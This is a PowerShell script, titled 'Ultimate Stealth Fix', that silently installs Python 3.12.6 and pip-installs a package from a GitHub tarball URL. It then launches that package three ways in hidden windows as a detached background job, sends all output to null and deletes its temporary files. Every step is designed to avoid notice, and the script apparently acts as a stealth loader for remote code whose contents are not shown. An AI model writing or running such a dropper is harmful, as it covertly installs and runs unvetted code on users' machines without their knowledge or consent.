# ===================================================
# Python 3.12.6 + httpfluent (Ultimate Stealth Fix)
# TOTAL SILENCE - ALL OUTPUT TO NULL
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

# --- Pre-Check (Silent) ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $CheckPath = "python"
} elseif (Test-Path $PythonExe) {
    $CheckPath = $PythonExe
}

if ($CheckPath) {
    $VersionString = & $CheckPath --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") { 
            $InstallRequired = $false 
            $ExecutableToUse = $CheckPath
        }
    }
}

# --- YOUR ALGORITHM (Steps 1-5) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1 }
    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
    
    try {
        (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
    } catch { exit 1 }

    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1

    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
    
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Step 7: Package Installation ---
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# --- THE MASTER FIX: TRIPLE-METHOD BACKGROUND LAUNCH ---
# This block attempts to launch the process and keep it alive after the script dies.

$ScriptBlock = {
    $TargetDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
    $TargetExe = Join-Path $TargetDir "python.exe"
    $TargetBin = Join-Path $TargetDir "Scripts\httpfluent.exe"

    # Method A: Direct EXE
    if (Test-Path $TargetBin) { Start-Process $TargetBin -WindowStyle Hidden > $null 2>&1 }
    
    # Method B: PowerShell Command
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command httpfluent" -WindowStyle Hidden > $null 2>&1
    
    # Method C: Module Mode
    Start-Process $TargetExe -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
}

# Start the launch block as a background job so it detaches from this script
Start-Job -ScriptBlock $ScriptBlock > $null 2>&1

# Brief wait to ensure jobs are triggered
Start-Sleep -Seconds 5

# --- Step 8: Cleanup ---
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
}
